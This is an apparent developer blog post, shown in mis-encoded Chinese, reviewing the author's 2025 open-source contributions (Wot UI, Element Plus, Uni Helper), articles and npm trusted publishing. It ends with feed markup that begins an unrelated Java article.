<p>Wot UI æ˜¯ç”± <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FMoonofweisheng" target="_blank" title="https://github.com/Moonofweisheng" ref="nofollow noopener noreferrer">@ä¸å¦‚æ‘¸é±¼å»</a> å‘èµ·çš„é«˜é¢œå€¼ã€è½»é‡åŒ–çš„ uni-app ç»„ä»¶åº“ï¼Œä¹Ÿæ˜¯ç›®å‰ uni-app æœ€å—æ¬¢è¿çš„ç»„ä»¶åº“ä¹‹ä¸€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/4ee25b03d214489bb3bcc34322e14ed0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=i66pU4LBQzkfZhEYRMrLTPA99A4%3D" alt="" loading="lazy"/></p>
<p>ä»Šå¹´ä¸º Wot UI è´¡çŒ®äº†ä¸€äº›æ–‡æ¡£ç›¸å…³çš„æ”¹è¿›ï¼Œæœ‰å¹¸å¾—åˆ°ä½œè€… <strong>@ä¸å¦‚æ‘¸é±¼å»</strong> çš„é‚€è¯·æˆä¸ºå›¢é˜Ÿæˆå‘˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5242f41819e64895af5b2812f8c52ce0~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=acv4CvudzvSv%2Bylg7hzO39mD99M%3D" alt="" loading="lazy"/></p>
<p>å¸Œæœ›æœªæ¥å¯ä»¥ä¸º Wot UI çš„å‘å±•åšå‡ºæ›´å¤šé«˜è´¨é‡çš„è´¡çŒ® ï½</p>
<p>åœ¨è¿™é‡Œæƒ³å’Œå¤§å®¶åˆ†äº«çš„æ˜¯ï¼Œå¯¹äº nutui-uniapp å’Œ Wot UI æˆ‘çš„ç¬¬ 1 ä¸ª PR å¹¶ä¸æ˜¯æ–°å¢é‡å¤§ç‰¹æ€§æˆ–è€…ä¿®å¤å…³é”®é”™è¯¯ä¹‹ç±»çš„é‡è¦å·¥ä½œï¼Œä»…ä»…åªæ˜¯æ–‡æ¡£ç›¸å…³çš„å†…å®¹ï¼Œæ‰€ä»¥å½“å¤§å®¶æƒ³è¦ä¸ºä¸€ä¸ªå¼€æºé¡¹ç›®è´¡çŒ®ä»£ç çš„æ—¶å€™ï¼Œä¸å¿…åˆ»æ„å»è€ƒè™‘åº”è¯¥åšä»€ä¹ˆï¼Œåªè¦ä½ èƒ½å¤Ÿè§£å†³ä½ æ‰€é‡åˆ°çš„é—®é¢˜ï¼Œæ— è®ºå¤§å°ï¼Œå¤§èƒ†å‘èµ·ä½ çš„ç¬¬ 1 ä¸ª PR å§ï¼</p>
<blockquote>
<p>å½“é‡åˆ°æŸä¸ªå¼€æºé¡¹ç›®å‡ºç°é—®é¢˜æ—¶ï¼Œè¯·ä¸è¦æŠ±æ€¨å’Œè°©éª‚ï¼Œåªé¡¾å®£æ³„è‡ªå·±çš„æƒ…ç»ªæ²¡æœ‰ä»»ä½•æ„ä¹‰ï¼Œè€Œæ˜¯åº”è¯¥ç†æ€§åœ°å‘ä½œè€…æ¸…æ™°æŠ¥å‘Šé—®é¢˜ï¼Œå¦‚æœèƒ½é™„å¸¦è‡ªå·±çš„è§£å†³æ–¹æ¡ˆï¼Œç›¸ä¿¡è¿™ä¸ªé—®é¢˜ä¼šå¾ˆå¿«è§£å†³ï¼</p>
</blockquote>
<h3 data-id="heading-4">Element Plus</h3>
<blockquote>
<p>é¡¹ç›®é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felement-plus%2Felement-plus" target="_blank" title="https://github.com/element-plus/element-plus" ref="nofollow noopener noreferrer">github.com/element-pluâ€¦</a></p>
</blockquote>
<p>èµ·å› æ˜¯åœ¨ã€Œæ€å¦ã€çœ‹åˆ°ä¸€ä¸ª el-table ç›¸å…³çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fsegmentfault.com%2Fq%2F1010000046643253" target="_blank" title="https://segmentfault.com/q/1010000046643253" ref="nofollow noopener noreferrer">é—®é¢˜</a>ï¼Œå®šä½ä¸€ç•ªä¸‹æ¥å‘ç°æ˜¯ el-table æºç ä¸­çš„ç›¸å…³é€»è¾‘è€ƒè™‘æœ‰æ‰€ç–å¿½å¯¼è‡´çš„ï¼Œæ‰€ä»¥å°±æäº¤äº†ä¸€ä¸ª PRï¼ˆ<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Felement-plus%2Felement-plus%2Fpull%2F20995" target="_blank" title="https://github.com/element-plus/element-plus/pull/20995" ref="nofollow noopener noreferrer">#20995</a>ï¼‰æ¥ä¿®å¤è¿™ä¸ªé—®é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/182eaa14834a4039a5f606b5aa0c84ba~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=VTw9Nf8TUuP8cJmafXZ7rZbz3Hg%3D" alt="" loading="lazy"/></p>
<p>ğŸ¤“ å˜¿å˜¿ï¼Œç¬¬ä¸€æ¬¡å‘ä¸Šä¸‡ Stars çš„é¡¹ç›®æäº¤ PR è¢«åˆå¹¶ï¼Œè¿˜æ˜¯å¾ˆé«˜å…´çš„ï¼Œæ‰€ä»¥åœ¨è¿™é‡Œä¹Ÿåšä¸€ä¸ªç®€å•çš„è®°å½•å§ ï½</p>
<h3 data-id="heading-5">Uni Helper</h3>
<blockquote>
<p>å®˜ç½‘é“¾æ¥ï¼š<a href="https://link.juejin.cn?target=https%3A%2F%2Funi-helper.cn" target="_blank" title="https://uni-helper.cn" ref="nofollow noopener noreferrer">uni-helper.cn</a></p>
</blockquote>
<p>Uni Helper æ˜¯ç”± <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FModyQyW" target="_blank" title="https://github.com/ModyQyW" ref="nofollow noopener noreferrer">@ModyQyW</a> åˆ›å»ºçš„æ—¨åœ¨å¢å¼º uni-app ç³»åˆ—äº§å“å¼€å‘ä½“éªŒçš„å¼€æºç¤¾åŒºç»„ç»‡ï¼Œç›®æ ‡æ˜¯è®© uni-app å¼€å‘è¿‡ç¨‹æ›´ç›´è§‚ã€é«˜æ•ˆï¼Œå¼€å‘ä½“éªŒæ›´å‡ºè‰²ï¼</p>
<p>ä»Šå¹´å‘ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Funi-helper%2Fvite-plugin-uni-pages" target="_blank" title="https://github.com/uni-helper/vite-plugin-uni-pages" ref="nofollow noopener noreferrer">@uni-helper/vite-plugin-uni-pages</a>ã€<a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Funi-helper%2Fcreate-uni" target="_blank" title="https://github.com/uni-helper/create-uni" ref="nofollow noopener noreferrer">create-uni</a> å’Œ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Funi-helper%2Funh" target="_blank" title="https://github.com/uni-helper/unh" ref="nofollow noopener noreferrer">@uni-helper/unh</a> ç­‰é¡¹ç›®è´¡çŒ®äº†ä¸€äº›ä»£ç ï¼Œå¾ˆè£å¹¸åŠ å…¥äº† Uni Helper å›¢é˜Ÿï¼</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72629db524d345258abc3d7caccb15fd~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=E6eX%2FU2Yj1aStusoQvHBBORu760%3D" alt="" loading="lazy"/></p>
<p>ä¹Ÿç»“è¯†äº†ç¤¾åŒºçš„ä¸€äº›æœ‹å‹ï¼Œåœ¨ä»–ä»¬çš„é¡¹ç›®ä¸­å­¦åˆ°å¾ˆå¤šä¸œè¥¿ï¼Œéå¸¸æ„Ÿè°¢å¤§å®¶ï¼</p>
<h3 data-id="heading-6">å…¶ä»–é¡¹ç›®</h3>
<p>æŠ€æœ¯ä¸åº”è¯¥æ°¸è¿œéƒ½æ˜¯ä¸¥è‚ƒçš„ï¼Œä¹Ÿå¯ä»¥æ˜¯æœ‰è¶£çš„ï¼Œä»Šå¹´æˆ‘è¿˜åšäº†ä¸€äº›æœ‰æ„æ€çš„å°é¡¹ç›® ğŸ® ã€‚</p>
<ul>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaohe0601%2Fmagic-sort" target="_blank" title="https://github.com/xiaohe0601/magic-sort" ref="nofollow noopener noreferrer">magic-sort</a>ï¼šğŸ¤“ ç”±è¿æ°”é©±åŠ¨çš„é­”æ³•æ’åºå·¥å…·</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaohe0601%2Fleafer-labubu" target="_blank" title="https://github.com/xiaohe0601/leafer-labubu" ref="nofollow noopener noreferrer">leafer-labubu</a>ï¼šğŸ§¸ åŸºäº Leafer Vue ç»˜åˆ¶çš„ LABUBU</li>
<li><a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaohe0601%2Fgomoku-next" target="_blank" title="https://github.com/xiaohe0601/gomoku-next" ref="nofollow noopener noreferrer">gomoku-next</a>ï¼šâšª åŠ å…¥é“å…·æœºåˆ¶çš„äº”å­æ£‹æ¸¸æˆ</li>
<li>â€¦â€¦</li>
</ul>
<p>æ¬¢è¿åˆ° <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2Fxiaohe0601" target="_blank" title="https://github.com/xiaohe0601" ref="nofollow noopener noreferrer">æˆ‘çš„ Github ä¸»é¡µ</a> æ¢ç´¢æ›´å¤šæœ‰è¶£çš„å¼€æºé¡¹ç›®ï¼</p>
<h2 data-id="heading-7">âœï¸ æ–‡ç« åˆ›ä½œ</h2>
<p>7 æœˆ 27 æ—¥å‘å¸ƒäº†æˆ‘çš„ç¬¬ä¸€ç¯‡æ–‡ç«  <a href="https://juejin.cn/post/7531676192397033472" target="_blank" title="https://juejin.cn/post/7531676192397033472">ã€ŠğŸª€ Uni EChartsï¼šä¹Ÿè®¸æ˜¯ uni-app ä¸­ä½¿ç”¨ ECharts æœ€ä¼˜é›…çš„è§£å†³æ–¹æ¡ˆã€‹</a>ï¼Œè™½ç„¶åªæ˜¯æ€»ç»“äº† Uni ECharts çš„æ–‡æ¡£å†…å®¹ï¼Œä½†è¿™ä¹Ÿæ ‡å¿—ç€æˆ‘çš„æ–‡ç« åˆ›ä½œç”Ÿæ¶¯æ­£å¼å¼€å¯ã€‚</p>
<p>åŒæ—¶ï¼Œåˆ›å»ºäº†è‡ªå·±çš„ä¸ªäººå¾®ä¿¡å…¬ä¼—å·ã€Œå°ä½•ä¸ä¼šå†™ä»£ç ã€ï¼Œä¸å®šæœŸåˆ†äº«ä¸€äº›å¼€å‘å¿ƒå¾—ã€æœ€ä½³å®è·µä»¥åŠæŠ€æœ¯æ¢ç´¢ç­‰å†…å®¹ï¼Œæ¬¢è¿å¤§å®¶å…³æ³¨ï¼ğŸ‘</p>
<h3 data-id="heading-8">Virtual Crypto Key</h3>
<blockquote>
<p>æ–‡ç« é“¾æ¥ï¼š<a href="https://juejin.cn/post/7539193228790185999" target="_blank" title="https://juejin.cn/post/7539193228790185999">juejin.cn/post/753919â€¦</a></p>
</blockquote>
<p>ç¬¬ä¸€ç¯‡æ–‡ç« å‘å¸ƒåæ”¶è·çš„é˜…è¯»é‡è¿˜æŒºé«˜çš„ï¼Œè¿™è®©æˆ‘ä¿¡å¿ƒå€å¢ã€‚</p>
<p>å¤§å®¶å¯èƒ½æƒ³ä¸åˆ°ï¼Œæˆ‘å·²ç»å¼€å§‹è€ƒè™‘å†™ã€Œæ˜é‡‘å°å†Œã€çš„äº‹æƒ…äº† ğŸ¤¡ï¼Œæ‰€ä»¥å°è¯•å†™äº†å‡ ç¯‡æ’ä»¶å¼€å‘å®æˆ˜çš„æ–‡ç« ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/e31eac72a0f44d60b0513eb6a0400df3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=1gmp7nIMPpj8pjrM2l8ZNhLiW7k%3D" alt="" loading="lazy"/></p>
<p>å¦‚ä½ æ‰€è§ï¼Œæ•°æ®æƒ¨æ·¡ï¼Œæ ¹æœ¬æ²¡æœ‰å¤šå°‘äººæƒ³çœ‹æˆ‘çš„æ–‡ç« ï¼Œæˆ–è®¸æˆ‘çœŸçš„ä¸é€‚åˆå†™ä½œï¼Œä¸€åº¦æƒ³è¦æ”¾å¼ƒâ€¦â€¦</p>
<h3 data-id="heading-9">LABUBU</h3>
<blockquote>
<p>æ–‡ç« é“¾æ¥ï¼š<a href="https://juejin.cn/post/7571846248719581184" target="_blank" title="https://juejin.cn/post/7571846248719581184">juejin.cn/post/757184â€¦</a></p>
</blockquote>
<p>ç»ˆäºï¼Œäº‹æƒ…è¿æ¥äº†è½¬æœºï¼</p>
<p>å¶ç„¶çœ‹åˆ° <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FFliPPeDround" target="_blank" title="https://github.com/FliPPeDround" ref="nofollow noopener noreferrer">@FliPPeDround</a> çš„ <a href="https://link.juejin.cn?target=https%3A%2F%2Fgithub.com%2FFliPPeDround%2Fleafer-vue" target="_blank" title="https://github.com/FliPPeDround/leafer-vue" ref="nofollow noopener noreferrer">leafer-vue</a>ï¼Œè¿™æ˜¯ä¸€ä¸ªéå¸¸æ£’çš„é¡¹ç›®ï¼Œå¯ä»¥ä½¿ç”¨ Vue ç»„ä»¶åŒ–å¼€å‘ Leafer åº”ç”¨ï¼Œæˆ‘è¿«ä¸åŠå¾…æƒ³è¦è¯•è¯•ï¼Œæ‰€ä»¥å°±ç”»äº†ä¸€ä¸ªå½“æ—¶å¾ˆç«çˆ†çš„ LABUBU ç©å¶ï¼Œç„¶åå†™äº†ä¸€ç¯‡æ–‡ç« æ¥è®°å½•å®ç°è¿‡ç¨‹ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/c76dc70448fc4ecbb3a2c4d8c65e5e5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=180r6ZqHgv7j%2Bs6uR3aoPDfiuUs%3D" alt="" loading="lazy"/></p>
<p>ä¸å¯æ€è®®ï¼Œæˆ‘çš„æ–‡ç« ç«äº†ï¼å†²ä¸Šçƒ­æ¦œç¬¬ä¸€ï¼Œä¹Ÿå¦‚æ„¿ç™»ä¸Šã€Œæ˜é‡‘ä¸€å‘¨ã€ä½œä¸ºæ ‡é¢˜ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/58cacc56697d42258ae19bd2c06b475d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=1E4xjdsTOarJDM%2FrYZxQ1BWexPI%3D" alt="" loading="lazy"/></p>
<p>æ²¡æƒ³åˆ°å¤§å®¶è‡ªå‘ä¸¾è¡Œäº†ä¸€åœº AI ç»˜åˆ¶ LABUBU å¤§èµ›ï¼Œå¯ä»¥å»åŸæ–‡ç« è¯„è®ºåŒºå›´è§‚ï¼Œä¹Ÿå¯ä»¥ç§€å‡ºä½ çš„ä½œå“ï¼ğŸ’ª</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/186a53c9fc4340a69ae6c61c96a9dbb3~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=H%2BuRJublip1V5xFTZsYHTq2Hcvk%3D" alt="" loading="lazy"/></p>
<p>èƒ½å¤Ÿæ”¶åˆ°å¤§é‡çš„ç‚¹èµã€æ”¶è—å’Œè¯„è®ºäº’åŠ¨ï¼Œæˆ‘å—å® è‹¥æƒŠï¼Œéå¸¸æ„Ÿè°¢å¤§å®¶çš„å–œæ¬¢ï¼</p>
<h3 data-id="heading-10">é“å…·äº”å­æ£‹</h3>
<blockquote>
<p>æ–‡ç« é“¾æ¥ï¼š<a href="https://juejin.cn/post/7579805639436025908" target="_blank" title="https://juejin.cn/post/7579805639436025908">juejin.cn/post/757980â€¦</a></p>
</blockquote>
<p>11 æœˆ 12 æ—¥ TRAE SOLO ä¸­å›½ç‰ˆæ­£å¼ä¸Šçº¿ï¼Œæˆ‘ç”¨ SOLO åšäº†ä¸€ä¸ªé“å…·äº”å­æ£‹æ¸¸æˆï¼Œå‚åŠ æ˜é‡‘çš„ SOLO å¾æ–‡æ´»åŠ¨è·å¾—ã€Œä¼˜ç§€æ–‡ç« å¥–ã€ç¬¬ 4 åã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3f852acddf1d4235a329bbe17267b615~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=Yu6XI0qZdxffcr%2Bf3KYZ%2FawYrQU%3D" alt="" loading="lazy"/></p>
<h3 data-id="heading-11">Uni ECharts</h3>
<blockquote>
<p>æ–‡ç« é“¾æ¥ï¼š<a href="https://juejin.cn/post/7569413676157222927" target="_blank" title="https://juejin.cn/post/7569413676157222927">juejin.cn/post/756941â€¦</a></p>
</blockquote>
<p>ä»Šå¹´ä¸ºæˆ‘çš„ Uni ECharts é¡¹ç›®å†™äº† 5 ç¯‡åˆ†äº«æ–‡ç« ï¼Œå…¶ä¸­ä¸€ç¯‡åœ¨ DCloud é—®ç­”ç¤¾åŒºçš„é¸¿è’™å¾æ–‡æ´»åŠ¨è·å¾—ã€Œä¸‰ç­‰å¥–ã€ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/90d6a6f0b65e4e818f76bb3449ebda87~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=aCeGumeG847%2B19IJ3O7EEYbbSIE%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-12">ğŸˆ ä¸€äº›è¶£äº‹</h2>
<h3 data-id="heading-13">Trusted Publisher Evangelist</h3>
<p>ä¼—æ‰€å‘¨çŸ¥ï¼Œnpm è¿‘å¹´æ¥å‘ç”Ÿå¤šèµ· token æ³„éœ²äº‹ä»¶ï¼Œvantã€rspack å’Œ chalk ç­‰æµè¡Œæ’ä»¶è¢«æ³¨å…¥æ¶æ„ä»£ç å‘å¸ƒï¼Œå½±å“èŒƒå›´ååˆ†å¹¿æ³›ã€‚</p>
<p>æ‰€ä»¥ npm æ¨å‡ºäº†æ–°çš„ Trusted publishing å‘å¸ƒæ–¹å¼ï¼Œå…è®¸ä¸ä½¿ç”¨ token è€Œæ˜¯ä½¿ç”¨ OpenID Connect (OIDC) èº«ä»½éªŒè¯ç›´æ¥ä» CI/CD å·¥ä½œæµç¨‹ä¸­å‘å¸ƒï¼Œè¯¦ç»†å¯æŸ¥çœ‹ <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.npmjs.com%2Ftrusted-publishers" target="_blank" title="https://docs.npmjs.com/trusted-publishers" ref="nofollow noopener noreferrer">Trusted publishing for npm packages</a> ã€‚</p>
<p>åˆšå¥½æˆ‘åœ¨è‡ªå·±çš„ä¸€äº›æ’ä»¶ä¸­æ¥å…¥äº†è¿™ç§å‘å¸ƒæ–¹å¼ï¼Œä¾¥å¹¸ç­”å¯¹äº† <strong>@FliPPeDround</strong> å’Œ <strong>@ä¸å¦‚æ‘¸é±¼å»</strong> ä¸¤ä½å¤§ä½¬å‘å‡ºçš„å°è€ƒéªŒã€‚ğŸ¶</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b2c292cfcc224a73a253ff20c92b2014~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=2ljiHvzVzr%2FxC4%2BMO7QUDukcQjg%3D" alt="" loading="lazy"/></p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7f8e27dd12c34e4b9f92f9ed970b1bcf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=fy9NkYCvA%2BP428%2BQ8WcD4sJiRoM%3D" alt="" loading="lazy"/></p>
<p>ğŸ˜ æœ€ç»ˆè£è· <strong>@FliPPeDround</strong> æˆäºˆçš„ã€ŒTrusted Publisher Evangelistã€ç§°å·ã€‚</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/66d0aa3a9ce74072ba4e7a8f6fe2db5e~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgeGlhb2hlMDYwMQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1767603668&amp;x-signature=BRP%2FZfYy%2FBu%2FxUBBIZZrdeEYB0s%3D" alt="" loading="lazy"/></p>
<h2 data-id="heading-14">ğŸ§­ æ€»ç»“ä¸å±•æœ›</h2>
<h3 data-id="heading-15">2025 æ€»ç»“</h3>
<p>å›çœ‹ 2025ï¼Œæˆ‘å¹¶æ²¡æœ‰å®Œæˆä»€ä¹ˆæƒŠå¤©åŠ¨åœ°çš„äº‹æƒ…ï¼Œä½†è¿™ä¸€å¹´å¯¹æˆ‘æ¥è¯´ä¾ç„¶å¾ˆé‡è¦ã€‚</p>
<p>è¿™ä¸€å¹´æœ‰è¿‡å…´å¥‹ï¼Œä¹Ÿæœ‰è¿‡å¤±è½ã€‚å†™è¿‡æ²¡äººç‚¹èµçš„æ–‡ç« ï¼Œä¹Ÿåšè¿‡åªæœ‰è‡ªå·±åœ¨ä¹çš„å°é¡¹ç›®ã€‚æœ‰äº›ç›®æ ‡æ²¡æœ‰å®Œæˆï¼Œæœ‰äº›æœŸå¾…è½ç©ºï¼Œä½†å¥½åœ¨æˆ‘æ²¡æœ‰åœä¸‹æ¥ã€‚</p>
<p>è‡³å°‘ï¼Œæˆ‘åœ¨æŒç»­åœ°åšäº‹ã€æŒç»­åœ°æ€è€ƒï¼Œä¹Ÿæ…¢æ…¢æ‰¾åˆ°äº†æ›´é€‚åˆè‡ªå·±çš„èŠ‚å¥ã€‚</p>
<h3 data-id="heading-16">2026 å±•æœ›</h3>
<p>å¸Œæœ› 2026 èƒ½è¿‡å¾—æ…¢ä¸€ç‚¹ï¼Œä¹Ÿç¨³ä¸€ç‚¹ã€‚</p>
<p>ä¸æ€¥ç€è¯æ˜ä»€ä¹ˆï¼Œä¸åˆ»æ„è¿½æ±‚ç»“æœï¼Œåªæ˜¯æŠŠæ­£åœ¨åšçš„äº‹æƒ…è®¤çœŸåšå¥½ï¼šæŠŠé¡¹ç›®ç»´æŠ¤ä¸‹å»ï¼ŒæŠŠæƒ³å†™çš„ä¸œè¥¿å†™æ¸…æ¥šï¼ŒæŠŠæŠ€æœ¯ç»§ç»­å½“æˆä¸€ä»¶å€¼å¾—æŠ•å…¥æ—¶é—´çš„äº‹ã€‚</p>
<p>æ„¿æˆ‘ä¾ç„¶å¯¹æŠ€æœ¯ä¿æŒå¥½å¥‡ï¼Œå¯¹ä¸–ç•Œä¿æŒè¡¨è¾¾æ¬²ï¼Œå¯¹è‡ªå·±ä¿æŒè€å¿ƒã€‚</p>
<p>æ–°çš„ä¸€å¹´ï¼Œç»§ç»­å‘å‰å§ï¼</p>
<h2 data-id="heading-17">ğŸµ å†™åœ¨æœ€å</h2>
<p>æˆ‘æ˜¯ xiaohe0601ï¼Œçƒ­çˆ±ä»£ç ï¼Œç›®å‰ä¸“æ³¨äº Web å‰ç«¯é¢†åŸŸã€‚</p>
<p>æ¬¢è¿å…³æ³¨æˆ‘çš„å¾®ä¿¡å…¬ä¼—å·ã€Œå°ä½•ä¸ä¼šå†™ä»£ç ã€ï¼Œæˆ‘ä¼šä¸å®šæœŸåˆ†äº«ä¸€äº›å¼€å‘å¿ƒå¾—ã€æœ€ä½³å®è·µä»¥åŠæŠ€æœ¯æ¢ç´¢ç­‰å†…å®¹ï¼Œå¸Œæœ›èƒ½å¤Ÿå¸®åˆ°ä½ ï¼</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[JavaåŸºç¡€ç¯‡â€”â€”ç¬¬ä¸‰éƒ¨]]></title>    <link>https://juejin.cn/post/7588999772750725155</link>    <guid>https://juejin.cn/post/7588999772750725155</guid>    <pubDate>2025-12-29T09:13:34.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7588999772750725155" data-draft-id="7588999772750708771" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="JavaåŸºç¡€ç¯‡â€”â€”ç¬¬ä¸‰éƒ¨"/> <meta itemprop="keywords" content="å‰ç«¯,Java"/> <meta itemprop="datePublished" content="2025-12-29T09:13:34.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="é’è²843"/> <meta itemprop="url" content="https://juejin.cn/user/541408646929991"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="æ˜é‡‘"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            JavaåŸºç¡€ç¯‡â€”â€”ç¬¬ä¸‰éƒ¨
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/541408646929991/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    é’è²843
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-29T09:13:34.000Z" title="Mon Dec 29 2025 09:13:34 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-29
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    é˜…è¯»7åˆ†é’Ÿ
